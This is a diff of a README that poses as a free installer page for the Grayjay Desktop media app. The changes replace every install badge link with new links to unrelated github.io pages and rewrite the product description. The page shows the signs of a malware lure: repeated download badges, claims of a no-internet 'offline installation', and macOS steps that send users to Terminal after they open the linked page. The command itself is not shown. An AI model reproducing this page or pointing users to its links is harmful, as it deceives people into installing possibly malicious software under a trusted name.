@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Content+Platform-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Media+Streaming-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Grayjay Desktop Free Installer** — Grayjay Desktop is a free, open-source desktop media player and content aggregator that allows watching content from YouTube, Twitch, Patreon, Nebula, and other platforms without using their official apps or websites. Works without internet access, no account required. Full offline installation.
+**💻 Grayjay Desktop Free Installer** — Grayjay Desktop is an open-source unified media platform that aggregates content from YouTube, Twitch, Nebula, and other streaming services into a single ad-free interface. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Grayjay Desktop](https://img.shields.io/badge/⬇_Install_Grayjay+Desktop-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Grayjay Desktop](https://img.shields.io/badge/⬇_Install_Grayjay+Desktop-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Grayjay Desktop
 
-Grayjay Desktop is a free, open-source desktop media player and content aggregator that allows watching content from YouTube, Twitch, Patreon, Nebula, and other platforms without using their official apps or websites. Combine content from multiple sources in a unified feed, download videos for offline viewing, and take back control of your content consumption without being subject to platform recommendation algorithms.
+Grayjay Desktop is an open-source unified media platform that aggregates content from YouTube, Twitch, Nebula, and other streaming services into a single ad-free interface. It imports subscriptions from existing accounts and plays content without tracking or ads.
 
 ---
 
 ## ❌ Problem: Grayjay Desktop is hard to access
 
-- **Platform Support** — Platform plugins may break when APIs change
-- **Legal Considerations** — Downloading platform content may violate platform terms of service
-- **Desktop Focus** — Mobile version separate; cross-device sync requires setup
-- **Platform Availability** — Content availability depends on maintained platform plugins
+- **Platform Fragility** — Depends on reverse-engineered APIs that can break after platform updates
+- **No Official Support** — Community-maintained plugins with no guaranteed stability
+- **Limited Platform Coverage** — Not all streaming services have working plugins
+- **Legal Gray Area** — Ad-blocking and API scraping may violate platform terms of service
 
 ---
 
@@ -61,9 +61,9 @@ Grayjay Desktop is a free, open-source desktop media player and content aggregat
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Grayjay Desktop is a free, open-source desktop media player and content aggregat
 
 <div align="center">
 
-[![⬇ Install Grayjay Desktop](https://img.shields.io/badge/⬇_Install_Grayjay+Desktop-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Grayjay Desktop](https://img.shields.io/badge/⬇_Install_Grayjay+Desktop-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Grayjay Desktop is a free, open-source desktop media player and content aggregat
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Grayjay Desktop is a free, open-source desktop media player and content aggregat
 
 ---
 
-**Grayjay Desktop Free Installer** — Grayjay Desktop is a free, open-source desktop media player and content aggregator that allows watching content from YouTube, Twitch, Patreon, Nebula, and other platforms without using their official apps or websites. Install without internet connection today!
+**Grayjay Desktop Free Installer** — Grayjay Desktop is an open-source unified media platform that aggregates content from YouTube, Twitch, Nebula, and other streaming services into a single ad-free interface. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Grayjay Desktop](https://img.shields.io/badge/⬇_Install_Grayjay+Desktop-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Grayjay Desktop](https://img.shields.io/badge/⬇_Install_Grayjay+Desktop-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
